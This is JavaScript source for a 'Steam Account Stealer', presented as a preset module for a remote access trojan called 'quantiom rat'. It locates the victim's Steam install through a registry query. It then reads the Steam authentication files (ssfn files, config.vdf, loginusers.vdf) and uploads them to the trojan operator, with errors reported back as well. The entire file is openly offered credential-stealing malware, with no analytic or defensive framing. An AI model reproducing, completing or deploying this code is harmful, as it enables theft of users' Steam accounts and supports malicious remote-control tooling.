/**
 * Steam Account Stealer
 * Preset Code for quantiom rat
 *
 * Description: Grabs all the required authentication files for Steam (ssfn*, loginusers.vdf, and config.vdf) and puts it in the client's file uploads.
 * Last Updated: 9/7/2020
 */

try {
    const fs = require('fs');
    const { exec } = require('child_process');

    let is64 = false;

    try {
        is64 = !!fs.statSync('C:\\windows\\sysnative');
    } catch (e) {}

    exec(
        `%windir%\\${is64 ? 'sysnative' : 'system32'}\\REG.exe QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Valve\\Steam /v InstallPath`,
        {},
        (err, stdout, stderr) => {
            if (err) {
                postData(err.stack, 'Steam Account Stealer Error');
                return;
            }

            const steamDir = stdout
                .toString()
                .split('REG_SZ')[1]
                .replace(/\r+|\n+|\s+/gi, '')
                .toLowerCase();

            // ssfn files
            fs.readdirSync(steamDir)
                .filter((f) => f.startsWith('ssfn'))
                .forEach((file) => {
                    uploadFile(fs.readFileSync(`${steamDir}/${file}`), file, 'Steam SSFN File');
                });

            // loginusers.vdf / config.vdf
            if (fs.existsSync(steamDir + '/config')) {
                uploadFile(fs.readdirSync(steamDir + '/config/config.vdf'), 'config.vdf', 'Steam Config VDF File');
                uploadFile(fs.readdirSync(steamDir + '/config/loginusers.vdf'), 'loginusers.vdf', 'Steam loginusers VDF File');
            }
        }
    );
} catch (e) {
    postData(e.stack, 'Steam Account Stealer Error');
}
